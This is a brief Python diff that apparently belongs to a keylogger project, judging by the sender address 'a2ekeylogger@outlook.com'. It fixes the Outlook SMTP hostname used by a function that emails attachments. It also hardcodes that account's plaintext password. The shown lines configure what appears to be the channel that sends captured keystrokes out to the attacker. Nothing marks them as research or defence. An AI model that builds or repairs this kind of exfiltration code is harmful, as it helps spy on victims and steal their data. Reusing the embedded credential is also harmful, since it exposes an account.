@@ -39,7 +39,7 @@ def send_email_with_attachment(smtp_server, smtp_port, from_email, password, to_
         print(f"Erreur lors de l'envoi de l'email: {e}")
 
 # Paramètres de l'email
-smtp_server = 'smtp-email.outlook.com'  # Exemple pour Outlook
+smtp_server = 'smtp-mail.outlook.com'  # Exemple pour Outlook
 smtp_port = 587  # Port pour TLS
 from_email = 'a2ekeylogger@outlook.com'  # Votre adresse email
 password = 'mdp?2__aazz'  # Votre mot de passe (Attention aux problèmes de sécurité)
